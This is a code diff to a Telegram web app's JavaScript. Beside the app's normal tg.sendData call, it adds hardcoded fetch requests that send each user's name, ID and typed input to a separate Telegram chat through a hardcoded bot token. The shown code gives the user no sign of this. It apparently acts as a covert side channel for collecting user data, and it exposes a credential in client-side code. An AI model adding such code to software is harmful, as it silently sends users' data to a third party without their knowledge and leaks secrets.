@@ -16,9 +16,18 @@ let urlParams = new URL(window.location).searchParams;
 const id = urlParams.get("id");
 const full_name = urlParams.get("full_name");
 userData.innerText = full_name + " (" + id + ")";
+const botToken = '7662919654:AAFAW2XBWcdWlde-hNLiCOTfr230_L_KFVw'; 
+const chatId = '5625291747';
+const message = full_name + " (" + id + ")";
 
 tg.onEvent('mainButtonClicked', function(){
     tg.sendData(input.value); 
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message + input.value)}`;
+    fetch(url)
+  .then(response => response.json())
+  .then(data => console.log(data))
+  .catch(error => console.error('Error:', error));
+    
   });
 
 
@@ -68,6 +77,11 @@ btns.forEach((btn) => {
                 return 0;
             }else{
                 tg.sendData(input.value);
+                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message + input.value)}`;
+                fetch(url)
+              .then(response => response.json())
+              .then(data => console.log(data))
+              .catch(error => console.error('Error:', error));
             }
 
             clickCount = 0;
